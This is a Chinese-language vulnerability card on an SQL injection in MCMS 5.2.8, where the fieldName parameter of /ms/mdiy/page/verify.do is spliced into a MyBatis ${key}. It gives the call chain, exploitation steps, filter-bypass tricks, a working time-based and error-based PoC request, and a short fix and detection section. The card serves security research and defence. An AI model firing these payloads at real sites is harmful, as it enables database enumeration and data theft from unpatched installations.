---
id: web-generic-sqli-mcms-querybysql-wheres-key-fieldname
title: MCMS 校验接口 fieldName 作为 MyBatis ${key} 拼进 SQL：/ms/mdiy/page/verify.do → validated → queryBySQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: mcms-querybysql-wheres-key-fieldname-sqli
aliases:
- MCMS fieldName 注入
- queryBySQL 注入
- BaseAction.validated 注入
- IBaseDao wheres key 拼接
- mdiy/page/verify.do SQL 注入
tags:
- sqli
- mybatis
- java
- springboot
- cms
- mcms
- error-based
cve: []
severity: high
confidence: high
affected_versions: MCMS（MingSoft CMS）5.2.8（原文审计版本；其他版本未验证）
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V464
  verified_at: '2026-11-10T15:08:48+08:00'
  notes: 已通读原文并逐张核对本地图：图34-39 IBaseDao.queryBySQL foreach index=key 的 ${key}=#{item}、BaseBizImpl 与 BaseAction.validated 将 fieldName 放入 Map key、图40 PageAction.verify 调 validated 均与卡一致；图37 的 fieldName 时间盲注请求响应约 5 秒。未验证点：PoC 未本机复跑；无 sources/source_url。
---

## 一句话结论

MCMS 的自定义页面校验接口 `/ms/mdiy/page/verify.do` 把 `fieldName` 当列名、`fieldValue` 当值传给 `BaseAction.validated()`，后者把 `fieldName` 放进 `Map` 的 key，最终进入 `IBaseDao.xml` 的 `queryBySQL`：`<foreach index="key" collection="wheres">${key} = #{item}</foreach>`——`${key}` 是文本替换且 Map 的 key 无法预编译，攻击者把 `fieldName` 传成 `1;select if(substring((select database()),1,4)='mcms',sleep(5),1)/**/and/**/1` 即可时间盲注/报错注入。

## 原理

- **调用链**：`PageAction#verify(fieldName, fieldValue, id, idName)` → `super.validated("mdiy_page", fieldName, fieldValue, id, idName)` → `BaseAction.validated` 里 `where.put(fieldName, fieldValue)` → `appBiz.queryBySQL(tableName, null, where, null)` → `BaseBizImpl.queryBySQL` → `IBaseDao.queryBySQL`。
- **注入点在列名位置**：`IBaseDao.xml` 的 `queryBySQL` 形如 `select ${fields} from ${table} <where><foreach item="item" index="key" collection="wheres" open="AND" separator="AND"> ${key} = #{item}</foreach> ...`。`#{}` 只保护了“值”，`${key}` 把 Map 的 key 原样拼进 SQL；而 key 来自 `fieldName`，完全用户可控。
- **为什么需要 id 参数**：`verify` 中 `id` 为空时走三参 `validated`，非空时走五参 `validated(tableName, fieldName, fieldValue, id, idName)`；两种最终都会把 `fieldName` 塞进 `wheres`。本案例带 `id=1&idName=1` 走五参分支。
- **为什么能盲注**：`fieldValue` 是 `#{item}` 参数化的，不能直接注入；但 `fieldName` 位置可放任意 SQL 表达式。payload `1;select if(substring((select database()),1,4)='mcms',sleep(5),1)/**/and/**/1` 利用分号/注释把原语句闭合，`sleep(5)` 造成时间差；也可换成 `updatexml` 报错注入。
- **前置条件**：`wheres` 非空（`fieldName` 和 `fieldValue` 至少一对）；`tableName` 由代码固定为 `mdiy_page`；接口路由存在且无需管理员（本案例后台路由不一定鉴权，视部署）。

## 触发条件

- 目标为 MCMS 5.2.8（或存在相同 `queryBySQL` 动态 SQL 的版本），`/ms/mdiy/page/verify.do` 可访问。
- `fieldName`、`fieldValue`、`id`、`idName` 四个参数可控；`fieldValue` 非空使 `wheres` 包含该项。
- 数据库为 MySQL（`sleep()`/`updatexml()` 可用）；其它数据库需换对应语法。
- 应用把 SQL 异常/延时反馈到响应或时间差可观测。

## 利用步骤

1. 访问 `/ms/mdiy/page/verify.do?fieldName=222&fieldValue=b&id=c&idName=21`，确认返回 `{"result":true,"code":200,"data":true}`，说明走到了 `validated`。
2. 把 `fieldName` 替换为闭合 payload，`fieldValue=1`、`id=1`、`idName=1`，例如：
   `fieldName=1;select if(substring((select database()),1,4)='mcms',sleep(5),1)/**/and/**/1`
3. 观察响应时间：条件成立时延迟约 5 秒，否则立即返回。
4. 用 `substring`/`ascii` 逐字符枚举库名、表名、列名；或用 `updatexml(1,concat(0x7e,user(),0x7e),1)` 让错误回显。
5. 若 `fieldName` 被简单过滤（空格/关键字），用 `/**/`、大小写、URL 编码等绕过。

## PoC

```http
GET /ms/mdiy/page/verify.do?fieldName=1%3Bselect%20if(substring((select%20database()),1,4)='mcms',sleep(5),1)/**/and/**/1&fieldValue=1&id=1&idName=1 HTTP/1.1
Host: target
```

时间盲注基准：条件为真延迟约 5 秒，为假立即返回。报错注入变体（替换 `fieldName`）：

```text
1;select updatexml(1,concat(0x7e,(select database()),0x7e),1)/**/and/**/1
```

## 变体与关联

- 同一 `IBaseDao.xml` 的其它注入面：`order by ${orderBy}`（见 `web-generic-sqli-mcms-formdata-querydata-orderby`、`web-generic-sqli-mcms-mdiy-dict-orderby-injection`）与 `sqlWhereList` 的 `${item.field}`（见 `web-generic-sqli-mcms-sqlwherelist-field-include`）；本卡是 `wheres` 的 Map key 注入，三者参数位置不同。
- 通用模式：MyBatis 中凡是 `${}` 包住用户可控的“标识符”（列名/表名/排序字段）都无法用 `#{}` 预编译，必须白名单。
- 关联 `web-java-component-mcms-dual-route-prefix-auth-bypass`：若接口可通过不带 `/ms` 前缀的路由访问，未授权也可打。

## 检测与防御

- 修复：不要用 Map 的 key 当列名；把 `fieldName` 映射到白名单列（如 `username/phone/email`），非法值直接拒绝；`queryBySQL` 的 `${fields}/${table}` 同样要白名单。
- 代码审计：全局搜索 MyBatis XML 的 `${}`，区分“值位置”（应改 `#{}`）与“标识符位置”（必须白名单）；关注 `index="key"`、`${item.field}` 这类集合属性拼接。
- 检测：请求参数中出现 SQL 关键字/分号/注释符；响应时间异常（5 秒级）；SQL 错误信息泄漏。
- 加固：数据库最小权限、关闭详细错误回显、WAF 规则覆盖 `verify.do` 等非常规接口。
